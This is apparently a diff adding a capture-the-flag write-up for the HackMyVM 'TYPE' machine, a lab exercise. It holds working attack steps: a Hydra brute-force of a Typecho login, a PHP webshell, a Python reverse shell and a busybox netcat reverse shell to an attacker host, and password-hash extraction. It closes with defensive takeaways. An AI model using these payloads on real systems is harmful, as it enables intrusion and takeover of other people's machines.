@@ -1,0 +1,212 @@
+HackMyVM – TYPE Machine Writeup
+
+Category: Offensive Security / Boot2Root
+Difficulty: Medium
+Goal: User + Root Flag
+Machine IP: 192.168.56.108
+
+📌 Initial Enumeration
+
+We begin with a full port scan using Nmap:
+
+nmap -p- -sC -sV 192.168.56.108
+🔍 Scan Results
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0
+80/tcp open  http    nginx
+Web server running Typecho CMS (v1.3.0)
+SSH available → possible later access vector
+🌐 Web Enumeration
+
+Browsing http://192.168.56.108 reveals:
+
+Blog-like interface
+Comment functionality
+Two users discovered:
+admin
+sburro
+
+Clicking on admin redirects to:
+
+devnotes.dsz
+
+➡️ Add to /etc/hosts:
+
+192.168.56.108 devnotes.dsz
+🔎 Directory & Endpoint Fuzzing
+
+We fuzz the new domain:
+
+ffuf -u http://devnotes.dsz/FUZZ -w wordlist.txt
+Key Findings:
+/admin → login panel
+/config.inc.php → accessible (important)
+/install → restricted
+/index.php/<id>/ → multiple endpoints
+
+From the scan logs:
+
+🔐 Credential Harvesting (Wordlist Attack)
+
+We generate a custom wordlist using CeWL:
+
+cewl http://devnotes.dsz/ > password.txt
+
+Then brute-force login using Hydra:
+
+hydra -L username.txt -P password.txt devnotes.dsz http-post-form \
+"/index.php/action/login:name=^USER^&password=^PASS^:F=Invalid"
+✅ Credentials Found:
+Username: sburro
+Password: DevNotes
+🧠 Post-Login Exploration
+
+After login:
+
+Limited privileges
+Access to dashboard features
+Found a suspicious string:
+2DbYCYpXwvV9kKwO
+
+(possible credential or token)
+
+💉 Remote Code Execution (RCE)
+
+Inside admin panel:
+
+Appearance → Edit index.php
+
+Inject PHP webshell:
+
+<?php
+if(isset($_GET['cmd']))
+{
+    system($_GET['cmd']);
+}
+?>
+Test Command Execution:
+http://devnotes.dsz/index.php?cmd=id
+
+Output:
+
+uid=65534(nobody) gid=65534(nobody)
+
+➡️ RCE confirmed
+
+🐚 Reverse Shell
+
+Start listener:
+
+nc -lvnp 4444
+
+Trigger reverse shell:
+
+python3 -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.56.106",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+import pty;
+pty.spawn("/bin/sh")'
+🔧 Shell Stabilization
+
+Check available shells:
+
+cat /etc/shells
+
+Output:
+
+/bin/sh
+/bin/ash
+
+Stabilize:
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+stty raw -echo; fg
+👤 User Flag
+
+Navigate to user directory:
+
+cd /home/plugugly
+ls
+cat user.txt
+🚩 User Flag:
+flag{user-f1315ee82308853cc1a9402f2cfa6d1c}
+🗄️ Database Enumeration
+
+Explore:
+
+cd /data/database
+cat typecho.db | grep -i plugugly
+🔑 Extracted Hash:
+plugugly$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U
+🔓 Password Cracking
+
+Crack hash → result:
+
+2boobies
+🔐 SSH Access
+ssh plugugly@192.168.56.108
+
+Login successful.
+
+⚡ Privilege Escalation
+
+Check sudo permissions:
+
+sudo -l
+Output:
+(ALL) NOPASSWD: /root/typer.py
+
+⚠️ Important:
+
+Requires graphical interface
+🖥️ X11 Forwarding
+
+Use:
+
+ssh -X plugugly@192.168.56.108
+export XAUTHORITY=/home/plugugly/.Xauthority
+
+Run:
+
+sudo /root/typer.py
+🧠 Exploitation Insight
+
+The script interacts with:
+
+/usr/local/bin/cleanup_scores.sh
+
+We inject reverse shell:
+
+echo "busybox nc 192.168.56.106 4444 -e sh" >> /usr/local/bin/cleanup_scores.sh
+🐚 Root Shell
+
+Start listener:
+
+nc -lvnp 4444
+
+Re-run:
+
+sudo /root/typer.py
+
+➡️ Script executes → reverse shell triggered as root
+
+🏁 Root Access Achieved
+
+You now have full system control.
+
+🧾 Key Takeaways
+Weak credential exposure via CMS
+Wordlist-based brute force still effective
+CMS file editing → easy RCE vector
+Database leaks sensitive hashes
+Poor sudo configuration → privilege escalation
+Writable script executed by root = game over
+🧠 Real-World Lessons
+Never expose CMS admin panels without protection
+Avoid storing weak password hashes
+Restrict file editing in production environments
+Validate sudo permissions strictly
+Monitor script execution paths
